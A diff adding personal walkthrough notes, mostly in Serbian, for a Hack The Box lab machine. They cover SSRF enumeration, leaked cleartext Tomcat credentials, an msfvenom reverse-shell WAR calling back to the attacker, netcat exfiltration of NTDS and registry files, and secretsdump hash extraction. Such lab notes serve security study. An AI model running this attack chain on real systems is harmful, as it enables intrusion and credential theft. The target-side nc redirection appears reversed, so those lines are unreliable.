@@ -1,0 +1,237 @@
+sjelicic@Laki:~$ sudo nmap -sV -sC -O -A 10.10.10.55 
+sjelicic@Laki:~$ sudo nmap -p- -sC -sV -O -A 10.10.10.55 				<- skenira sve portove, u slucaju da se neki servisi vrte na 
+																			nestandardnim
+sudo /opt/discover/discover.sh 
+
+sjelicic@Laki:~$ ifconfig
+inet 10.10.14.6 														<- IP adresa VPN konekcije (tun0), moj racunar
+
+sjelicic@Laki:~/htb$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+###kada pokusam da pristupim preko Kotarak web browsera
+sjelicic@Laki:~/htb$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.10.55 - - [28/May/2019 14:14:07] "GET / HTTP/1.1" 200 - 				<- nema user agent stringa
+
+sjelicic@Laki:~$ wfuzz -c -z range,1-65535 --hl=2 http://10.10.10.55:60000/url.php?path=127.0.0.1:FUZZ 
+#komanda u ovom formatu nije hteal da radi
+#wfuzz -c -z range,1-65535 --hl=2 "http://10.10.10.55:60000/url.php?path=htpp://localhost:FUZZ"
+
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /usr/local/lib/python2.7/dist-packages/wfuzz/plugins/payloads/bing.py Exception, msg=No module named shodan
+libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /usr/local/lib/python2.7/dist-packages/wfuzz/plugins/payloads/shodanp.py Exception, msg=No module named shodan
+********************************************************
+* Wfuzz 2.4 - The Web Fuzzer                           *
+********************************************************
+
+Target: http://10.10.10.55:60000/url.php?path=127.0.0.1:FUZZ
+Total requests: 65535
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                                                          
+===================================================================
+
+000000022:   200        4 L      4 W      62 Ch       "22"                                                                             
+000000090:   200        11 L     18 W     156 Ch      "90"                                                                             
+000000110:   200        17 L     24 W     187 Ch      "110"                                                                            
+000000200:   200        3 L      2 W      22 Ch       "200"                                                                            
+000000320:   200        26 L     109 W    1232 Ch     "320"                                                                            
+000000888:   200        78 L     265 W    3955 Ch     "888"                                                                            
+000060000:   200        78 L     130 W    1171 Ch     "60000"                                                                          
+
+Total time: 219.3023
+Processed Requests: 65535
+Filtered Requests: 65528
+Requests/sec.: 298.8340
+
+
+
+BurpSuite request (original)
+GET /url.php?path=file%3A%2F%2F%2Fetc%2Fpasswd HTTP/1.1
+Host: 10.10.10.55:60000
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Referer: http://10.10.10.55:60000/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,hr;q=0.8
+Connection: close
+
+BurpSuite Repeater (modifikovano)
+GET /url.php?path=file HTTP/1.1 								<- dobijam try harder
+
+GET /url.php?path=http://localhost:60000 HTTP/1.1 				<- dobijam nazad stranicu
+
+GET /url.php?path=http://localhost:888 HTTP/1.1 				<- dobijam file browser i listu fajlova koje postoje na serveru
+
+GET /url.php?path=http://localhost:888/?doc=backup HTTP/1.1 	<- backup fajl koji ima pass/user za Apache Tomcat u cleartext-u
+
+<user username="admin" password="3@g01PdhB!" roles="manager,manager-gui,admin-gui,manager-script"/>
+
+
+
+
+
+Apache Tomcat admin console
+http://localhost:8080/manager/html
+
+
+### create a malicious war file
+probao tomcatWarDeployer (https://github.com/mgeeky/tomcatWarDeployer), nece radi
+
+
+sjelicic@Laki:~/htb$ msfvenom -l payloads | grep -i java
+    firefox/shell_bind_tcp                              Creates an interactive shell via Javascript with access to Firefox's XPCOM API
+    firefox/shell_reverse_tcp                           Creates an interactive shell via Javascript with access to Firefox's XPCOM API
+    java/jsp_shell_bind_tcp                             Listen for a connection and spawn a command shell
+    java/jsp_shell_reverse_tcp                          Connect back to attacker and spawn a command shell
+    java/meterpreter/bind_tcp                           Run a meterpreter server in Java. Listen for a connection
+    java/meterpreter/reverse_http                       Run a meterpreter server in Java. Tunnel communication over HTTP
+    java/meterpreter/reverse_https                      Run a meterpreter server in Java. Tunnel communication over HTTPS
+    java/meterpreter/reverse_tcp                        Run a meterpreter server in Java. Connect back stager
+    java/shell/bind_tcp                                 Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Listen for a connection
+    java/shell/reverse_tcp                              Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Connect back stager
+    java/shell_reverse_tcp                              Connect back to attacker and spawn a command shell
+
+
+nc -lvnp 80 					<- da pokrenemo TCP listener za war fajl
+
+
+sjelicic@Laki:~/htb$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.6 LPORT=80 -f war -o test1.war
+Payload size: 1102 bytes
+Final size of war file: 1102 bytes
+Saved as: test1.war
+
+
+sjelicic@Laki:~/htb$ sudo nc -lvnp 80
+[sudo] password for sjelicic: 
+listening on [any] 80 ...
+
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.55] 39010 					<- nakon starta war payload-a
+
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+#pyton -c 							<- startuj komandu
+#import pty 						<- importuje pty modul
+#pty.spawn  						<- Spawn a process, and connect its controlling terminal with the current process’s standard io. 
+				   					This is often used to baffle programs which insist on reading from the controlling terminal.	
+#pty.spawn("/bin/bash")'			<- startuje terminal
+
+
+python command line 
+https://docs.python.org/3/using/cmdline.html
+https://docs.python.org/2/using/cmdline.html
+
+
+pty — Pseudo-terminal utilities
+https://docs.python.org/3.2/library/pty.html
+
+
+tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ file *
+file *
+20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit: data
+20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin: MS Windows registry file, NT/2000 or above
+
+#moj racunar
+sjelicic@Laki:~/htb$ sudo nc -lvnp 443 > kotarak.bin
+listening on [any] 443 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.55] 57102
+
+#kotarak
+nc 10.10.14.6 443 > 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
+
+
+#moj racunar
+sjelicic@Laki:~/htb$ sudo nc -lvnp 443 > kotarak.dit
+[sudo] password for sjelicic: 
+listening on [any] 443 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.55] 57100
+
+#kotarak
+nc 10.10.14.6 443 > 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
+
+#koristimo bootKey iz *.bin fajla da dekriptujemo *.dit fajl
+sjelicic@Laki:~/htb$ impacket-secretsdump -ntds kotarak.dit -system kotarak.bin LOCAL 		
+#accounts ending in $ are machine accounts and will have "super-strong" passes
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
